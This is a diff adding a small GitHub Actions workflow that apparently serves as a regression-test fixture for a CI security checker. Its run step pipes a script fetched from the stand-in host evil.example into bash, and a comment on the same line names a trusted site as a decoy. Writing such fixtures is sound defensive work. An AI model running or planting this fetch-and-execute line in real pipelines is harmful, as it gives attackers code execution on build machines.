@@ -1,0 +1,12 @@
+name: install
+on: push
+jobs:
+  install:
+    runs-on: ubuntu-24.04
+    steps:
+      # Regression test: a trusted hostname mentioned in an inline shell
+      # `#` comment on the same line as a real curl|bash must not grant
+      # trust to the fetched URL.
+      - name: install
+        run: |
+          curl -sL evil.example/payload | bash  # see firebase.tools for docs
